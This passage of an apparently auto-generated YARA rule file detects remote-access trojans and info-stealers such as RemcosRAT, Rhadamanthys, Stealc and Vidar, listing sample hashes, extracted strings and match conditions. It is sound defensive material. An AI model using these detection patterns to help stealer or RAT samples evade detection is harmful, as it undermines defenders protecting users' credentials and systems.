      hash6 = "898fa5e7ec65acee299dca750e5369836bd3453aad9e7d5fe5e6061ee24e35d3"
      hash7 = "a44128afda43c52008225dda2f60357b13030df3f639e42cd83c3e35e0e8c09a"
   strings:
      $s1 = "   - Keep track of common errors" fullword wide /* score: '13.00'*/
      $s2 = "   - Get adequate sleep the night before" fullword wide /* score: '12.00'*/
      $s3 = "   - Question: Formulate questions about the content" fullword wide /* score: '12.00'*/
      $s4 = "   - Preview headings and subheadings first" fullword wide /* score: '12.00'*/
      $s5 = "   - Skimming: Get general overview" fullword wide /* score: '12.00'*/
      $s6 = "   - Makes it easier to get partial credit on exams" fullword wide /* score: '12.00'*/
      $s7 = "   - Plan your study sessions in advance" fullword wide /* score: '10.00'*/
      $s8 = "   - Use the Eisenhower Matrix (urgent/important)" fullword wide /* score: '10.00'*/
      $s9 = "   - Add keywords and questions in the cue column" fullword wide /* score: '10.00'*/
      $s10 = "   - Summarize key points at the bottom" fullword wide /* score: '10.00'*/
      $s11 = "   - Indent supporting details under main points" fullword wide /* score: '10.00'*/
      $s12 = "   - Identify weak areas and focus study time there" fullword wide /* score: '10.00'*/
      $s13 = "   - Share different perspectives and approaches" fullword wide /* score: '10.00'*/
      $s14 = "   - Read: Read actively and purposefully" fullword wide /* score: '10.00'*/
      $s15 = "   - Highlight key points and important information" fullword wide /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__ccc8dfebc5d9971e8491d80ecc850a15_imphash__Rhadamanthys_signature__5c8e45b5d904cdcec55e8c9096808a42_imp_70 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_ccc8dfebc5d9971e8491d80ecc850a15(imphash).exe, Rhadamanthys(signature)_5c8e45b5d904cdcec55e8c9096808a42(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec8261150a6af49e8dc3324c5a8b2e84211c0dc2eac758e09dab5186052e044a"
      hash2 = "59138e5e81287cf58c13d9f22f41b52c56031aa6f0aceed79767c5e80e0f0c69"
   strings:
      $s1 = "clWebDarkMagenta" fullword ascii /* score: '14.00'*/
      $s2 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\FontSubstitutes" fullword ascii /* score: '12.00'*/
      $s3 = "\\SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\" fullword ascii /* score: '11.00'*/
      $s4 = "clWebGhostWhite" fullword ascii /* score: '9.00'*/
      $s5 = "clWebDarkRed" fullword ascii /* score: '9.00'*/
      $s6 = "clWebDarkGoldenRod" fullword ascii /* score: '9.00'*/
      $s7 = "clWebDarkBlue" fullword ascii /* score: '9.00'*/
      $s8 = "clWebMagenta" fullword ascii /* score: '9.00'*/
      $s9 = "clWebSeashell" fullword ascii /* score: '9.00'*/
      $s10 = "clWebDarkKhaki" fullword ascii /* score: '9.00'*/
      $s11 = "clWebDarkSlateBlue" fullword ascii /* score: '9.00'*/
      $s12 = "clWebDarkOliveGreen" fullword ascii /* score: '9.00'*/
      $s13 = "clWebDarkSlategray" fullword ascii /* score: '9.00'*/
      $s14 = "clWebDarkOrchid" fullword ascii /* score: '9.00'*/
      $s15 = "clWebDarkOrange" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__32d85ec6_SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c_71 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_32d85ec6.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1a3b0673.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_50c9089f.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bc50ae7a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "32d85ec69dd09f4808d33a117271e59e33b74febf82353d258e91745bb9980be"
      hash2 = "1a3b0673ca0264f6306fd9ef59ebf3e6b62d75def5f689eb8bd02f6a222a1e5d"
      hash3 = "50c9089fe18238d44095d1f897507eab89baa65c85dabed3f099b73611492ec8"
      hash4 = "bc50ae7aa9d0ebbabd5e6405dc7317b42e10f5559bb8e0e422c7b9ca5d38e231"
   strings:
      $s1 = "SetBinaryOperation" fullword ascii /* score: '12.00'*/
      $s2 = "{0:HH:mm:ss} - {1}" fullword wide /* score: '12.00'*/
      $s3 = "Calculator Plus - History Export" fullword wide /* score: '11.00'*/
      $s4 = "LogBase10" fullword ascii /* score: '10.00'*/
      $s5 = "CalculatorHistory_{0:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '10.00'*/
      $s6 = "GetHistoryStrings" fullword ascii /* score: '9.00'*/
      $s7 = "NaturalLog" fullword ascii /* score: '9.00'*/
      $s8 = "PerformUnaryOperation" fullword ascii /* score: '9.00'*/
      $s9 = "OperatorButton_Click" fullword ascii /* score: '9.00'*/
      $s10 = "GetLastEntry" fullword ascii /* score: '9.00'*/
      $s11 = "<Operand2>k__BackingField" fullword ascii /* score: '9.00'*/
      $s12 = "<Operand1>k__BackingField" fullword ascii /* score: '9.00'*/
      $s13 = "GetHistoryByDate" fullword ascii /* score: '9.00'*/
      $s14 = "set_Operand2" fullword ascii /* score: '9.00'*/
      $s15 = "CreateBasicOperatorButtons" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a2d1da15_SnakeKeylogger_signature__f34d5f2d4577ed6d9cee_72 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a2d1da15.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c2f71c00.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fd85a4e7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a2d1da157ce873841a4b6aec36638f2b0b9349730b67af3b2e866607587cbe4c"
      hash2 = "c2f71c006d57414ecfcc0a9718779ae6f19c63ff7ef6738c4a5aa7c38e28d77e"
      hash3 = "fd85a4e75158f628b44a723f2bffc2d6bae956051fc2495256011b9d552d9164"
   strings:
      $s1 = "paint.net 4.0.134" fullword ascii /* score: '10.00'*/
      $s2 = "GetScrambledWord" fullword ascii /* score: '9.00'*/
      $s3 = "<GetHighestScore>b__9_0" fullword ascii /* score: '9.00'*/
      $s4 = "<GetTopScores>b__4_1" fullword ascii /* score: '9.00'*/
      $s5 = "GetHighestScore" fullword ascii /* score: '9.00'*/
      $s6 = "GetAllScores" fullword ascii /* score: '9.00'*/
      $s7 = "<GetTopScores>b__4_0" fullword ascii /* score: '9.00'*/
      $s8 = "<GetAllScores>b__5_0" fullword ascii /* score: '9.00'*/
      $s9 = "get_DateAchieved" fullword ascii /* score: '9.00'*/
      $s10 = "Game Complete" fullword wide /* score: '9.00'*/
      $s11 = "{0}. {1} - {2} points" fullword wide /* score: '9.00'*/
      $s12 = "7+ letter words" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__73 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash11 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash12 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash13 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.hexdumpWords.func1" fullword ascii /* score: '20.00'*/
      $s2 = "wprocessorlevel" fullword ascii /* score: '19.00'*/
      $s3 = "wprocessorrevision" fullword ascii /* score: '19.00'*/
      $s4 = "dwactiveprocessormask" fullword ascii /* score: '19.00'*/
      $s5 = "dwnumberofprocessors" fullword ascii /* score: '19.00'*/
      $s6 = "dwprocessortype" fullword ascii /* score: '19.00'*/
      $s7 = "**struct { F uintptr; rw *runtime.rwmutex }" fullword ascii /* score: '18.00'*/
      $s8 = "*runtime.rwmutex" fullword ascii /* score: '18.00'*/
      $s9 = "sweepdone" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.(*mspan).sweep" fullword ascii /* score: '12.00'*/
      $s11 = "*runtime.systeminfo" fullword ascii /* score: '11.00'*/
      $s12 = "runlock" fullword ascii /* score: '11.00'*/
      $s13 = "runtime.readgogc" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.traceNextGC" fullword ascii /* score: '10.00'*/
      $s15 = "readerPass" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__74 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash4 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash5 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "bad defer entry in panicbad defer size class: i=bypassed recovery failedcan't scan our own stackconnection reset by peerdouble t" ascii /* score: '22.00'*/
      $s2 = "e nmspinninginvalid runtime symbol tablemheap.freeSpanLocked - span missing stack in shrinkstackmspan.sweep: m is not lockednewp" ascii /* score: '20.00'*/
      $s3 = "runtime/rwmutex.go" fullword ascii /* score: '18.00'*/
      $s4 = "?*struct { lock runtime.mutex; used uint32; fn func(bool) bool }" fullword ascii /* score: '18.00'*/
      $s5 = "sync/mutex.go" fullword ascii /* score: '15.00'*/
      $s6 = "runtime/time_nofake.go" fullword ascii /* score: '12.00'*/
      $s7 = "runtime/mgcsweep.go" fullword ascii /* score: '12.00'*/
      $s8 = "runtime/fastlog2.go" fullword ascii /* score: '12.00'*/
      $s9 = "newmHandoff.lockno route to hostnon-Go function" fullword ascii /* score: '12.00'*/
      $s10 = "syscall.procGetSystemDirectoryW" fullword ascii /* score: '11.00'*/
      $s11 = "runtime/internal/sys/intrinsics_common.go" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.convT2E" fullword ascii /* score: '10.00'*/
      $s13 = "runtime/error.go" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.armHasVFPv4" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.mDoFixup" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__75 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash3 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash4 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash5 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash6 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
   strings:
      $s1 = "internal/testlog.Logger" fullword ascii /* score: '18.00'*/
      $s2 = "internal/testlog.Getenv" fullword ascii /* score: '14.00'*/
      $s3 = "internal/syscall/windows/registry.Key.GetStringValue" fullword ascii /* score: '11.00'*/
      $s4 = "syscall.RegOpenKeyEx" fullword ascii /* score: '11.00'*/
      $s5 = "internal/syscall/windows/registry.Key.GetMUIStringValue" fullword ascii /* score: '11.00'*/
      $s6 = "syscall.RegEnumKeyEx" fullword ascii /* score: '11.00'*/
      $s7 = "internal/syscall/windows/registry.Key.getValue" fullword ascii /* score: '11.00'*/
      $s8 = "time.Date" fullword ascii /* score: '11.00'*/
      $s9 = "time.matchZoneKey" fullword ascii /* score: '10.00'*/
      $s10 = "time.Time.UTC" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.mapaccess2_faststr" fullword ascii /* score: '10.00'*/
      $s12 = "time.Now" fullword ascii /* score: '10.00'*/
      $s13 = "internal/testlog.Open" fullword ascii /* score: '9.00'*/
      $s14 = "internal/testlog.Stat" fullword ascii /* score: '9.00'*/
      $s15 = "os.openFileNolog" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__76 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash3 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash4 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash5 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash6 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash7 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash8 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "syscall.procGetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s2 = "syscall.procGetProcessTimes" fullword ascii /* score: '19.00'*/
      $s3 = "syscall.procGetCurrentProcessId" fullword ascii /* score: '19.00'*/
      $s4 = "syscall.procGetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s5 = "syscall.procCreateProcessAsUserW" fullword ascii /* score: '17.00'*/
      $s6 = "syscall.procOpenProcessToken" fullword ascii /* score: '17.00'*/
      $s7 = "syscall.procGetTempPathW" fullword ascii /* score: '15.00'*/
      $s8 = "syscall.procCreateProcessW" fullword ascii /* score: '14.00'*/
      $s9 = "syscall.procProcess32NextW" fullword ascii /* score: '14.00'*/
      $s10 = "syscall.procNetUserGetInfo" fullword ascii /* score: '14.00'*/
      $s11 = "syscall.procExitProcess" fullword ascii /* score: '14.00'*/
      $s12 = "syscall.procOpenProcess" fullword ascii /* score: '14.00'*/
      $s13 = "syscall.procProcess32FirstW" fullword ascii /* score: '14.00'*/
      $s14 = "syscall.procTerminateProcess" fullword ascii /* score: '14.00'*/
      $s15 = "syscall.procgethostbyname" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__77 {
   meta:
      description = "_subset_batch - from files SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash2 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash3 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "reflect.name.data" fullword ascii /* score: '11.00'*/
      $s2 = "reflect.(*funcType).common" fullword ascii /* score: '11.00'*/
      $s3 = "sched={pc: but progSize  nmidlelocked= on zero Value out of range  procedure in  to finalizer  untyped args -thread limit" fullword ascii /* score: '11.00'*/
      $s4 = "reflect.(*ptrType).common" fullword ascii /* score: '11.00'*/
      $s5 = "runtime.gcWriteBarrierDX" fullword ascii /* score: '10.00'*/
      $s6 = "reflect.name.tag" fullword ascii /* score: '10.00'*/
      $s7 = "strconv.min" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.gcWriteBarrierSI" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.convI2I" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.gcWriteBarrierCX" fullword ascii /* score: '10.00'*/
      $s11 = "internal/reflectlite.(*uncommonType).exportedMethods" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.gcWriteBarrierR8" fullword ascii /* score: '10.00'*/
      $s13 = "reflect.(*rtype).Key" fullword ascii /* score: '10.00'*/
      $s14 = "reflect.name.isExported" fullword ascii /* score: '10.00'*/
      $s15 = "reflect.(*uncommonType).exportedMethods" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__5a23efc3_RemcosRAT_signature__aa569300_78 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_5a23efc3.js, RemcosRAT(signature)_aa569300.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5a23efc306dd589c16d9781de2b9d26eeeddccfca23310247912edc3323fa979"
      hash2 = "aa56930042a94ecc6a42c1c4bbeadaf03229d2ec81784476c790977be5fc0100"
   strings:
      $x1 = "AAAAAAAAAAAA6" ascii /* base64 encoded string  */ /* reversed goodware string '6AAAAAAAAAAAA' */ /* score: '35.00'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '26.50'*/
      $s5 = "AAAAAAAAAAAA7" ascii /* base64 encoded string  */ /* score: '25.00'*/
      $s6 = "ZW5Ub0NsaWVudAAAAABSZW1vdmVQcm9wQQAAAFJlbW92ZU1lbnUAAAAAUmVsZWFzZURDAAAAUmVsZWFzZUNhcHR1cmUAAAAAUmVnaXN0ZXJXaW5kb3dNZXNzYWdlQQAA" ascii /* base64 encoded string */ /* score: '21.00'*/
      $s7 = "bGFzc0xvbmdBAAAAU2V0Q2FwdHVyZQAAAABTZXRBY3RpdmVXaW5kb3cAAABTZW5kTWVzc2FnZVcAAAAAU2VuZE1lc3NhZ2VBAAAAAFNjcm9sbFdpbmRvdwAAAABTY3Jl" ascii /* base64 encoded string */ /* score: '17.00'*/
      $s8 = "aABlAGwAcAAgAGYAbwB1AG4AZAAgAGYAbwByACAAYwBvAG4AdABlAHgAdAAkAE4AbwAgAHQAbwBwAGkAYwAtAGIAYQBzAGUAZAAgAGgAZQBsAHAAIABzAHkAcwB0AGUA" ascii /* base64 encoded string  */ /* score: '17.00'*/
      $s9 = "AAAAAAAAAABAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s11 = "AAAAAAAAAD" ascii /* base64 encoded string*/ /* score: '16.50'*/
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s13 = "AAAAAAAAAABAAAAAA" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD" ascii /* base64 encoded string  */ /* score: '16.50'*/
      $s15 = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string  */ /* score: '14.50'*/
   condition:
      ( uint16(0) == 0x6176 and filesize < 7000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__35fb644f_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a7_79 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_35fb644f.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4fd694ee.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d431af11.exe, Stealerium(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "35fb644ff75750a53c894f52fa160ca37af8370c99a2877d8e3d84f1ffae5b2f"
      hash2 = "4fd694eea69457f8141a22cdb979e68a321ddf53e74ea6f392360b86b12e9944"
      hash3 = "d431af117842085de4eab85ddc86bc5eeffa0130a55b9651aada9553b54d5e13"
      hash4 = "57ae7edf153dae62714e31efabe20bcd93fa7f69f9ffe3f69b6150ce0cc7e92c"
   strings:
      $s1 = "targetTimeZoneId" fullword ascii /* score: '14.00'*/
      $s2 = "GetCountdownRemaining" fullword ascii /* score: '9.00'*/
      $s3 = "GetStopwatchElapsed" fullword ascii /* score: '9.00'*/
      $s4 = "GetTimeZoneOffset" fullword ascii /* score: '9.00'*/
      $s5 = "GetActiveCountdownTimers" fullword ascii /* score: '9.00'*/
      $s6 = "GetTimeZoneDisplayName" fullword ascii /* score: '9.00'*/
      $s7 = "GetTimeInTimezone" fullword ascii /* score: '9.00'*/
      $s8 = "GetAvailableTimeZones" fullword ascii /* score: '9.00'*/
      $s9 = "GetActiveStopwatches" fullword ascii /* score: '9.00'*/
      $s10 = "stopwatches" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 21000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__80 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
